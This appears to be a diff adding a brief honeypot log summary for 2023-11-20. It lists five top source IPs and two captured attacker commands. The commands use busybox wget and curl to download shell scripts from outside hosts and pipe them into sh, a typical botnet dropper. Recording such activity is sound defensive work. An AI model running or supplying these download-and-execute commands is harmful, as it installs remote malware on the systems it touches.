@@ -1,0 +1,13 @@
+Top 5 IPs for 2023-11-20:
+64.227.155.58
+39.98.190.187
+99.230.148.188
+110.182.96.15
+117.235.117.180
+
+
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://14.225.206.204/w.sh; sh w.sh; curl http://14.225.206.204/c.sh; sh c.sh
+
+cd /data/local/tmp/;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
